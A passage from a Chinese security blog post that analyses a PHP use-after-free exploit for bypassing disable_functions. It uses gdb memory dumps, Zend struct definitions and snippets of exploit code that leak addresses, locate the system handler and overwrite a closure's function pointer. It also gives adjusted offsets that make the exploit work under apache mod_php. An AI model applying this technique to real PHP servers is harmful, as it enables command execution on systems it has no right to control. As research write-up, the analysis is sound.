<p>里面放着匿名函数相关的数据，b 实际上是一个 closure_handlers 对象：</p>
<p><img src="/css/images/uaf/2020032505.png" srcset="/img/loading.gif" lazyload></p>
<p>以上就是 exp 中用到的几个主要变量的情况，我们用调试函数拿到的 $abc 实际上跟 $helper 指向同一个地方，而 php 底层还是把 $abc 当作一个字符串来看，所以 strlen 和 [] 访问字符串大概就是这么个情况：</p>
<p><img src="/css/images/uaf/2020032506.png" srcset="/img/loading.gif" lazyload></p>
<p>所以在 UAF 正常的情况下，strlen($abc) 应该是一个很大的数字。我们继续往下看 exp：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$closure_handlers</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line"><span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br></pre></td></tr></table></figure>

<p>$closure_handlers 其实是 std_object_handlers 的地址，这个暂且不提；php_heap 则是下一个堆的头指针，也就是 0x00007ffff3e7f150；将下一个堆的头指针减去偏移的 0x58 + 一个堆的大小 0x70，就可以回到 $abc 处，即拿到 $abc 的地址：</p>
<p><img src="/css/images/uaf/2020032507.png" srcset="/img/loading.gif" lazyload></p>
<p>接下来的四步 write 则是在伪造 a，写完之后：</p>
<p><img src="/css/images/uaf/2020032508.png" srcset="/img/loading.gif" lazyload></p>
<p>a 变量变成了指向 0x00007ffff3e7f0e8 处的一个 zval：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p (zval)*<span class="number">0x7ffff3e7f098</span></span><br><span class="line">$<span class="number">4</span> = &#123;</span><br><span class="line">  value = &#123;</span><br><span class="line">    lval = <span class="number">140737285452008</span>, </span><br><span class="line">    dval = <span class="number">6.9533457830790204e-310</span>, </span><br><span class="line">    counted = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    str = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    arr = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    obj = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    res = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    ref = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    ast = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    zv = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    ptr = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    ce = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    func = <span class="number">0x7ffff3e7f0e8</span>, </span><br><span class="line">    ww = &#123;</span><br><span class="line">      w1 = <span class="number">4092063976</span>, </span><br><span class="line">      w2 = <span class="number">32767</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  u1 = &#123;</span><br><span class="line">    v = &#123;</span><br><span class="line">      type = <span class="number">10</span> <span class="string">&#x27;\n&#x27;</span>, </span><br><span class="line">      type_flags = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">      u = &#123;</span><br><span class="line">        extra = <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    type_info = <span class="number">10</span></span><br><span class="line">  &#125;, </span><br><span class="line">  u2 = &#123;</span><br><span class="line">    next = <span class="number">0</span>, </span><br><span class="line">    cache_slot = <span class="number">0</span>, </span><br><span class="line">    opline_num = <span class="number">0</span>, </span><br><span class="line">    lineno = <span class="number">0</span>, </span><br><span class="line">    num_args = <span class="number">0</span>, </span><br><span class="line">    fe_pos = <span class="number">0</span>, </span><br><span class="line">    fe_iter_idx = <span class="number">0</span>, </span><br><span class="line">    access_flags = <span class="number">0</span>, </span><br><span class="line">    property_guard = <span class="number">0</span>, </span><br><span class="line">    constant_flags = <span class="number">0</span>, </span><br><span class="line">    extra = <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>a 的类型为 10，即 REFERENCE：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">zend_reference</span> &#123;</span></span><br><span class="line">	zend_refcounted_h              gc;</span><br><span class="line">	zval                           val;</span><br><span class="line">	zend_property_info_source_list sources;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>这个 REFERENCE 有什么用后面再看，我们继续看 exp，closure_obj 其实就是 b 的地址，接下来则是重头戏的泄露地址：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$binary_leak</span> = <span class="title function_ invoke__">leak</span>(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>

<p>很明显是使用 $closure_handlers 的地址，即 0x00000000011ff820 处的 std_object_handlers 来泄露，写完数据之后 a 是这个样子的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x7ffff3e7f0e0</span>:	<span class="number">0x00007ffff3e7f150</span>	<span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x7ffff3e7f0f0</span>:	<span class="number">0x00000000011ff818</span>	<span class="number">0x0000000000000006</span></span><br></pre></td></tr></table></figure>

<p>后面三段就是 a 在内存里面的数据，转换成 ref 类型就是：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((zval)*<span class="number">0x7ffff3e7f098</span>)-&gt;value-&gt;ref</span><br><span class="line">$<span class="number">7</span> = &#123;</span><br><span class="line">  gc = &#123;</span><br><span class="line">    refcount = <span class="number">2</span>, </span><br><span class="line">    u = &#123;</span><br><span class="line">      type_info = <span class="number">0</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;, </span><br><span class="line">  val = &#123;</span><br><span class="line">    value = &#123;</span><br><span class="line">      lval = <span class="number">18872344</span>, </span><br><span class="line">      dval = <span class="number">9.3241768268981742e-317</span>, </span><br><span class="line">      counted = <span class="number">0x11ff818</span>, </span><br><span class="line">      str = <span class="number">0x11ff818</span>, </span><br><span class="line">      arr = <span class="number">0x11ff818</span>, </span><br><span class="line">      obj = <span class="number">0x11ff818</span>, </span><br><span class="line">      res = <span class="number">0x11ff818</span>, </span><br><span class="line">      ref = <span class="number">0x11ff818</span>, </span><br><span class="line">      ast = <span class="number">0x11ff818</span>, </span><br><span class="line">      zv = <span class="number">0x11ff818</span>, </span><br><span class="line">      ptr = <span class="number">0x11ff818</span>, </span><br><span class="line">      ce = <span class="number">0x11ff818</span>, </span><br><span class="line">      func = <span class="number">0x11ff818</span>, </span><br><span class="line">      ww = &#123;</span><br><span class="line">        w1 = <span class="number">18872344</span>, </span><br><span class="line">        w2 = <span class="number">0</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;, </span><br><span class="line">    u1 = &#123;</span><br><span class="line">      v = &#123;</span><br><span class="line">        type = <span class="number">6</span> <span class="string">&#x27;\006&#x27;</span>, </span><br><span class="line">        type_flags = <span class="number">0</span> <span class="string">&#x27;\000&#x27;</span>, </span><br><span class="line">        u = &#123;</span><br><span class="line">          extra = <span class="number">0</span></span><br><span class="line">        &#125;</span><br><span class="line">      &#125;, </span><br><span class="line">      type_info = <span class="number">6</span></span><br><span class="line">    &#125;, </span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>也就是说，a 这个 REFENCE 实际上指向了 0x11ff818，调用 strlen 就是把 0x11ff818 处的数据当作了 string 来处理，拿到的就是：</p>
<p><img src="/css/images/uaf/2020032509.png" srcset="/img/loading.gif" lazyload></p>
<p>也就是 zend_object_std_dtor 的地址，因为 strlen 返回的是指针 + 0x10 地址处的数据，所以 leak 函数泄露的就是 $addr + $p 地址处的数据。然后是 get_binary_base 函数，从 zend_object_std_dtor  往回搜索 ELF 文件的开头，找到了就是程序基地址，一共搜索 0x1000000 的地址，而 zend_object_std_dtor 函数的地址在没有 PIE 的情况下是 0x6d0ac0，所以一般都能找得到。接下来是 parse_elf，看名字是个解析 elf 文件的函数，看不懂，反正 ELF 格式也差不多，就跳过好了。</p>
<p>下面是根据解析 ELF 之后获得的 data 段 address、size 之类的数据获取函数基地址，同样也是搜索，开头是在 data 段前方：</p>
<p><img src="/css/images/uaf/2020032510.png" srcset="/img/loading.gif" lazyload></p>
<p>而结束的地方已经过了 bss 段，所以一般也能搜索得到。在 data 段里面可以看到有很多 zend_function_entry 都在这里，zend_function_entry 是 php 底层存储函数的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_function_entry</span> &#123;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">char</span> *fname;</span><br><span class="line">	zif_handler handler;</span><br><span class="line">	<span class="type">const</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_arg_info</span> *<span class="title">arg_info</span>;</span></span><br><span class="line">	<span class="type">uint32_t</span> num_args;</span><br><span class="line">	<span class="type">uint32_t</span> flags;</span><br><span class="line">&#125; zend_function_entry;</span><br></pre></td></tr></table></figure>

<p>fname 是函数名，handler 就是存放在内存里面的函数实现了，所以只要找到 system 函数的 handler 地址，然后用它替换掉 b ，就可以执行系统命令了。zend_function_entry  在内存是这样存放的：</p>
<p><img src="/css/images/uaf/2020032511.png" srcset="/img/loading.gif" lazyload></p>
<p>constant 和 bin2hex 就在 basic_functions 附近，所以可以通过搜索这两个函数来定位 basic_functions。同时我们可以看到 basic_functions 是一个函数数组，而 system 函数也位于 basic_functions 内：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd93688</span> <span class="string">&quot;exec&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x5cf7a0</span> &lt;zif_exec&gt;, </span><br><span class="line">  arg_info = <span class="number">0x11931e0</span> &lt;arginfo_exec&gt;, </span><br><span class="line">  num_args = <span class="number">3</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd9365d</span> <span class="string">&quot;system&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x5cf7b0</span> &lt;zif_system&gt;, </span><br><span class="line">  arg_info = <span class="number">0x1193180</span> &lt;arginfo_system&gt;, </span><br><span class="line">  num_args = <span class="number">2</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd93664</span> <span class="string">&quot;escapeshellcmd&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x5cfd60</span> &lt;zif_escapeshellcmd&gt;, </span><br><span class="line">  arg_info = <span class="number">0x11930e0</span> &lt;arginfo_escapeshellcmd&gt;, </span><br><span class="line">  num_args = <span class="number">1</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd93673</span> <span class="string">&quot;escapeshellarg&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x5cfe80</span> &lt;zif_escapeshellarg&gt;, </span><br><span class="line">  arg_info = <span class="number">0x11930a0</span> &lt;arginfo_escapeshellarg&gt;, </span><br><span class="line">  num_args = <span class="number">1</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd8f699</span> <span class="string">&quot;passthru&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x5cf7c0</span> &lt;zif_passthru&gt;, </span><br><span class="line">  arg_info = <span class="number">0x1193120</span> &lt;arginfo_passthru&gt;, </span><br><span class="line">  num_args = <span class="number">2</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd93682</span> <span class="string">&quot;shell_exec&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x5cff70</span> &lt;zif_shell_exec&gt;, </span><br><span class="line">  arg_info = <span class="number">0x1193060</span> &lt;arginfo_shell_exec&gt;, </span><br><span class="line">  num_args = <span class="number">1</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br><span class="line">  fname = <span class="number">0xd9368d</span> <span class="string">&quot;proc_open&quot;</span>, </span><br><span class="line">  handler = <span class="number">0x626af0</span> &lt;zif_proc_open&gt;, </span><br><span class="line">  arg_info = <span class="number">0x118fbe0</span> &lt;arginfo_proc_open&gt;, </span><br><span class="line">  num_args = <span class="number">6</span>, </span><br><span class="line">  flags = <span class="number">0</span></span><br><span class="line">&#125;, &#123;</span><br></pre></td></tr></table></figure>

<p>所以同样地从 basic_functions 往后搜索，我们就能拿到 system 函数的地址了。</p>
<p>接下来我们就要把 system 函数写到 b 上面。因为下个空块已经用来泄露地址了，所以 exp 的做法是在下下个空块直接伪造一个新的对象，首先把整个 b 复制过去，b 的定义如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_closure</span> &#123;</span></span><br><span class="line">	zend_object       <span class="built_in">std</span>;</span><br><span class="line">	zend_function     func;</span><br><span class="line">	zval              this_ptr;</span><br><span class="line">	zend_class_entry *called_scope;</span><br><span class="line">	zif_handler       orig_internal_handler;</span><br><span class="line">&#125; zend_closure;</span><br></pre></td></tr></table></figure>

<p>长度可以在 gdb 里面计算出来，为 0x130。然后 system 函数地址要填在哪里呢？</p>
<p>exp 是覆盖了 func-&gt;internal_function.handler，我们在源码里搜索也能看到 zend 里面有大量调用这个函数的地方，internal_function 是个这样的结构体：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">zend_internal_function</span> &#123;</span></span><br><span class="line">	<span class="comment">/* Common elements */</span></span><br><span class="line">	zend_uchar type;</span><br><span class="line">	zend_uchar arg_flags[<span class="number">3</span>]; <span class="comment">/* bitset of arg_info.pass_by_reference */</span></span><br><span class="line">	<span class="type">uint32_t</span> fn_flags;</span><br><span class="line">	zend_string* function_name;</span><br><span class="line">	zend_class_entry *scope;</span><br><span class="line">	zend_function *prototype;</span><br><span class="line">	<span class="type">uint32_t</span> num_args;</span><br><span class="line">	<span class="type">uint32_t</span> required_num_args;</span><br><span class="line">	zend_internal_arg_info *arg_info;</span><br><span class="line">	<span class="comment">/* END of common elements */</span></span><br><span class="line"></span><br><span class="line">	zif_handler handler;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> _<span class="title">zend_module_entry</span> *<span class="title">module</span>;</span></span><br><span class="line">	<span class="type">void</span> *reserved[ZEND_MAX_RESERVED_RESOURCES];</span><br><span class="line">&#125; zend_internal_function;</span><br></pre></td></tr></table></figure>

<p>可以看到跟参数有关的几个数据：num_args、required_num_args、*arg_info，handler 则是调用的函数。一般情况下 type 为 2，代表是用户函数，而 handler 则是一个无法访问的地址（在 7.2.11 好像是正常的地址），exp 将 type 修改为 1 代表内部函数，再将 system 地址写到 handler 上面之后，php 就会通过 ZEND_DO_FCALL_SPEC_RETVAL_UNUSED_HANDLER 调用它，最后调用的就是 php 自己实现的 system 函数。具体的执行流程涉及底层 zend 虚拟机、op 之类的东西，我不懂就不研究了。</p>
<hr>
<h3 id="调试开启-debug-的-apache-mod-php"><a href="#调试开启-debug-的-apache-mod-php" class="headerlink" title="调试开启 debug 的 apache mod_php"></a>调试开启 debug 的 apache mod_php</h3><p>漏洞算是调通了，现在试试调一下之前调不通的情况，到 write($abc, 0x10, $abc_addr + 0x60); 这一步的时候，问题已经很明显了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">40</span>xg <span class="number">0x7fae5bc68000</span></span><br><span class="line"><span class="number">0x7fae5bc68000</span>:	<span class="number">0x0000001800000001</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fae5bc68010</span>:	<span class="number">0x00007fae5bc023d8</span>	<span class="number">0x00007fae5b77cec0</span></span><br><span class="line"><span class="number">0x7fae5bc68020</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0xffffffffffffff98</span></span><br><span class="line"><span class="number">0x7fae5bc68030</span>:	<span class="number">0x000000000000000a</span>	<span class="number">0x00007fae5bc74c00</span></span><br><span class="line"><span class="number">0x7fae5bc68040</span>:	<span class="number">0x0000000000000308</span>	<span class="number">0x00007ffdf2695d60</span></span><br><span class="line"><span class="number">0x7fae5bc68050</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x00007ffdf2695d60</span></span><br><span class="line"><span class="number">0x7fae5bc68060</span>:	<span class="number">0x0000000000000001</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fae5bc68070</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000002</span></span><br><span class="line"><span class="number">0x7fae5bc68080</span>:	<span class="number">0x0000000000000068</span>	<span class="number">0x0000000000000006</span></span><br><span class="line"><span class="number">0x7fae5bc68090</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x00000000000000c4</span></span><br><span class="line"><span class="number">0x7fae5bc680a0</span>:	<span class="number">0x00007fae5bc5e100</span>	<span class="number">0x00007fae5bc81f80</span></span><br><span class="line"><span class="number">0x7fae5bc680b0</span>:	<span class="number">0x00007fae5bc5e140</span>	<span class="number">0x00007fae5bc82730</span></span><br><span class="line"><span class="number">0x7fae5bc680c0</span>:	<span class="number">0x00007fae5bc58e10</span>	<span class="number">0x00007fae5bc58e60</span></span><br><span class="line"><span class="number">0x7fae5bc680d0</span>:	<span class="number">0x00007fae5bc58eb0</span>	<span class="number">0x00007fae5bc82050</span></span><br><span class="line"><span class="number">0x7fae5bc680e0</span>:	<span class="number">0x00007fae5bc58a50</span>	<span class="number">0x00007fae5bc5eac0</span></span><br><span class="line"><span class="number">0x7fae5bc680f0</span>:	<span class="number">0x00007fae5bc804c0</span>	<span class="number">0x00007fae5bc58b40</span></span><br><span class="line"><span class="number">0x7fae5bc68100</span>:	<span class="number">0x00007fae5bc823c0</span>	<span class="number">0x00007fae5bc82550</span></span><br><span class="line"><span class="number">0x7fae5bc68110</span>:	<span class="number">0x0000555ef2e0eeb0</span>	<span class="number">0x0000000000000000</span></span><br><span class="line"><span class="number">0x7fae5bc68120</span>:	<span class="number">0x0000000000000078</span>	<span class="number">0x00007fae5b627628</span></span><br><span class="line"><span class="number">0x7fae5bc68130</span>:	<span class="number">0x0000000000000000</span>	<span class="number">0x0000000000000376</span></span><br></pre></td></tr></table></figure>

<p>exp 不通的原因就是现在内存分配方式跟之前不同了，新建的 helper 对象并没有分配到堆链里面，也就找不到每个堆的头指针，所以计算 $abc 地址的时候就会出错，变成 0x0 - 0xc8，a 指向的 $abc_addr + 0x60 就变成了一个超出范围的地址 0xffffffffffffff98，导致了程序崩溃。</p>
<p>所以我们需要换一个方式来计算 $abc 地址，我们往下看，可以看到下面有大小为 0xa0 的堆块：</p>
<p><img src="/css/images/uaf/2020032512.png" srcset="/img/loading.gif" lazyload></p>
<p>所以我们修改一下 php_heap 和 abc_addr 的计算方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$php_heap</span> = <span class="title function_ invoke__">str2ptr</span>(<span class="variable">$abc</span>, <span class="number">0x1c8</span>);</span><br><span class="line"><span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0x1c8</span> - <span class="number">0xa0</span>;</span><br></pre></td></tr></table></figure>

<p>然后再测试：</p>
<p><img src="/css/images/uaf/2020032513.png" srcset="/img/loading.gif" lazyload></p>
<p>exp 没问题，能打通了，good。</p>
<hr>
<h3 id="php-fpm"><a href="#php-fpm" class="headerlink" title="php-fpm"></a>php-fpm</h3><p>php-fpm 不加 debug 都打不通，加上 debug 调试一番，好像解析 ELF 出了问题，找不到头，不懂。</p>
<p>要用的时候查看版本和编译参数，然后直接通过偏移来算好了。</p>
<hr>
<p>Orz</p>

                
              </div>
            
            <hr/>
            <div>
              <div class="post-metas my-3">
  
  
    <div class="post-meta">
      <i class="iconfont icon-tags"></i>
      
        <a href="/tags/Web/" class="print-no-link">#Web</a>
      
        <a href="/tags/Pwn/" class="print-no-link">#Pwn</a>
      
        <a href="/tags/PHP/" class="print-no-link">#PHP</a>
      
        <a href="/tags/PHPUAF/" class="print-no-link">#PHPUAF</a>
      
    </div>
  
</div>


              
  

  <div class="license-box my-3">
    <div class="license-title">
      <div>PHP-UAF漏洞初探</div>
      <div>http://yoursite.com/2020/03/26/PHP-UAF漏洞初探/</div>
    </div>
    <div class="license-meta">
      
        <div class="license-meta-item">
          <div>作者</div>
          <div>Aluvion</div>
        </div>
      
      
        <div class="license-meta-item license-meta-date">
          <div>发布于</div>
          <div>2020年3月26日</div>
        </div>
      
      
      
        <div class="license-meta-item">
          <div>许可协议</div>
          <div>
            
              
              
                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
                    <i class="iconfont icon-cc-by"></i>
                  </span>
                </a>
              
            
          </div>
        </div>
      
    </div>
    <div class="license-icon iconfont"></div>
  </div>



              
                <div class="post-prevnext my-3">
                  <article class="post-prev col-6">
                    
                    
                      <a href="/2020/04/27/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E-readObject/" title="Java反序列化漏洞-readObject-apache-commons-collections">
                        <i class="iconfont icon-arrowleft"></i>
                        <span class="hidden-mobile">Java反序列化漏洞-readObject-apache-commons-collections</span>
                        <span class="visible-mobile">上一篇</span>
                      </a>
                    
                  </article>
                  <article class="post-next col-6">
                    
                    
                      <a href="/2020/03/22/CVE-2019-11043-Nginx-php-fpm-RCE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" title="CVE-2019-11043 Nginx+php-fpm RCE漏洞复现">
                        <span class="hidden-mobile">CVE-2019-11043 Nginx+php-fpm RCE漏洞复现</span>
                        <span class="visible-mobile">下一篇</span>
                        <i class="iconfont icon-arrowright"></i>
                      </a>
                    
                  </article>
                </div>
              
            </div>

            
          </article>
        </div>
      </div>
    </div>

    <div class="side-col d-none d-lg-block col-lg-2">
      
  <aside class="sidebar" style="margin-left: -1rem">
    <div id="toc">
  <p class="toc-header">
    <i class="iconfont icon-list"></i>
    <span>目录</span>
  </p>
  <div class="toc-body" id="toc-body"></div>
</div>



  </aside>


    </div>
  </div>
</div>





  



  



  



  



  







    

    
      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
      </a>
    

    
      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
     aria-hidden="true">
  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
    <div class="modal-content">
      <div class="modal-header text-center">
        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
          <span aria-hidden="true">&times;</span>
        </button>
      </div>
      <div class="modal-body mx-3">
        <div class="md-form mb-5">
          <input type="text" id="local-search-input" class="form-control validate">
          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
        </div>
        <div class="list-group" id="local-search-result"></div>
      </div>
    </div>
  </div>
</div>

    

    
  </main>

  <footer>
    <div class="footer-inner">
  
    <div class="footer-content">
       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
    </div>
  
  
  
</div>

  </footer>

  <!-- Scripts -->
  
  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />

  <script>
    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
    NProgress.start()
    window.addEventListener('load', function() {
      NProgress.done();
    })
  </script>


<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
<script  src="/js/events.js" ></script>
<script  src="/js/plugins.js" ></script>


  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
  <script>
    (function (window, document) {
      var typing = Fluid.plugins.typing;
      var subtitle = document.getElementById('subtitle');
      if (!subtitle || !typing) {
        return;
      }
      var text = subtitle.getAttribute('data-typed-text');
      
        typing(text);
      
    })(window, document);
  </script>




  
    <script  src="/js/img-lazyload.js" ></script>
  




  
<script>
  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
    var toc = jQuery('#toc');
    if (toc.length === 0 || !window.tocbot) { return; }
    var boardCtn = jQuery('#board-ctn');
    var boardTop = boardCtn.offset().top;

